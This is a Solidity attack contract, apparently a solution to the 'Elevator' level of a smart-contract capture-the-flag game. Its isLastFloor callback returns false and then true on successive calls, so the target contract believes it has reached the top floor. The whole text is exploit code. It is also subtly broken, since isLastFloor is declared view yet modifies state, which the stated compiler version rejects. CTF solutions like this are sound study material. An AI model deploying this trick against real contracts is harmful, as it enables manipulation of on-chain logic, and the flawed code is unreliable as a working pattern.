// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IElevator {
  function goTo(uint _floor) external;
}

contract HackElevator {
  bool public firstFloor = false;
  IElevator elevator;

  constructor(IElevator _elevator) public {
    elevator = IElevator(_elevator);
  }

  function getToLastFloor() public {
    elevator.goTo(0);
  }

  function isLastFloor(uint) public view returns (bool) {
    if(! firstFloor){
      firstFloor = true;
      return false;
    } else {
      firstFloor = false;
      return true;
    }
  }

}
